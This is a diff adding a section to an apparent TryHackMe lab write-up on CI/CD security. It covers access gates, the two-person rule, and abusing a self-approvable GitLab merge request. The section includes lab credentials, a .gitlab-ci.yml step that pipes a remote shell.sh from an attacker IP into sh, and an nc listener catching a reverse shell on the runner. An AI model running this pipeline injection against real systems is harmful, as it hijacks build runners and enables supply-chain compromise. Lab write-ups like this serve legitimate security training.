@@ -558,4 +558,88 @@ The following steps can be followed to protect both your build server and build 
 > 2. What can be used to add an additional layer of authentication security for build agents? - `Token-based authentication`
 > 3. Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2? - `THM{1769f7*********15cc}`
 
+## Securing the Build Pipeline :
+
+Even if we do everything correctly, **we still have to consider that one of our developers may be compromised**. Whether the actual developer is compromised through a _social engineering attack_ or _simply their credentials being exposed_, this compromise could be the downfall of our pipeline and build. Fortunately, there are protections that can be applied!
+
+### Access Gates -
+
+Access gates, also known as gates or checkpoints, serve as "stages" within a software development pipeline. They ensure that code progresses through the pipeline only after meeting predefined quality and security criteria. 
+
+### The Two-Person Concept -
+
+Even if we have access gates, we need to ensure that no single user can pass these access gates. **If we are the developer who initiated the build, we should be prevented from passing the next access gate.** This should always be someone else. By enforcing this with a technical control, it can be assured that in the event that a developer is compromised, a build cannot be pushed through. This is referred to as the two-person rule.
+
+### Exploiting Misconfigured Access Gates -
+
+Creds for Ana user - `anatacker:Password1@`
+
+_Ash has provided Ana with developer access to his Approval-Test repo, which can be found here: http://gitlab.tryhackme.loc/ash/approval-test. _
+
+To protect the main branch of the repo, Ash has configured the main branch to be a protected branch, where developers are only allowed to make merge requests and no direct code changes.
+
+Let's test this by updating the README file and trying to commit the change to the main branch. Navigate to the README file and click Edit:
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/32cc2257-e9bd-4fbf-85ed-20b39e264146)
+
+Now  Gitlab is automatically requesting that we start a merge request with the changes we want to make. We will also see that we cannot unselect the option to commit directly. Make a small change to the file and click Commit changes:
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/36ed1eb2-3502-4786-9598-3a93a3a43cea)
+
+> Ash's thought process behind this was that it would protect the main branch, as the _company has a policy that states merge requests must be approved by a manager_. Since we are now
+> forced to make a merge request, the main branch is protected. However, Ash has made the following two errors in his security thought process:
+
+- Policies that are not enforced through a technology will not be respected by attackers. Sure, the policy says that a manager must approve the merge request, but if you read the merge request, you will see that from a technical standpoint, Gitlab indicates that approval is optional.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/207b79da-a881-412c-aa1d-fc720300b370)
+
+- Although the main branch is protected by not allowing any direct pushes, since developers can still make merge requests, they can simply push their own merge request to commit code to the main branch. The two-person principle was not implemented to ensure that another person has to accept the merge request.
+
+Leveraging these mistakes, as an attacker, you can simply approve your own merge request (though it isn't even needed) and you can then merge it to the main branch, as shown below!
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/1a059cf7-63a9-4362-899d-ea98126f4fff)
+
+
+Reviewing the code in the main branch, we have made a change to the main branch! 
+
+Now comes the fun part. **The GitLab runner was configured to only run on the main branch. Since we can now push code to the main branch, we can compromise the runner**. 
+
+Now that we know how to get your code to the main branch, make some changes to the .**_gitlab-ci.yml*_* file to get code execution on the runner. 
+
+Modify the **_.gitlab-ci.yml_** file with the following contents:
+
+```yml
+   production:
+     stage: deploy
+     script:
+       - 'echo "Starting translator engine.... Please stand by...."'
+       - curl http://10.50.75.24:8080/shell.sh | sh
+     environment:
+       name: ${CI_JOB_NAME}
+```
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/8d188e83-e107-4204-91e1-adbc9a24faf0)
+
+To make the Gitlab runner run our malicious reverse shell code, we need to merge it to main branch by ourself.
+
+- Approve the request by ourselves.
+- Select _Merge Immediately_ option.
+
+Once the runner executes our code, we get a reverse shell back on our machine.
+
+```bash
+┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
+└─# nc -lvnp 8081
+listening on [any] 8081 ...
+connect to [10.50.75.24] from (UNKNOWN) [10.200.94.201] 52826
+/bin/sh: 0: can't access tty; job control turned off
+
+gitlab-runner@ip-10-200-94-201:~/builds/RYStXjj2/0/ash/approval-test$ id
+id
+uid=1001(gitlab-runner) gid=1001(gitlab-runner) groups=1001(gitlab-runner)
+```
+
+> 1. What can we add so that merges are raised for review instead of pushing the changes to code directly? - `merge requests`
+> 2. What should we do so that only trusted runners execute CI/CD jobs? - `limit runner access`
+> 3. Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3? - `THM{2411*********503e6}`
 
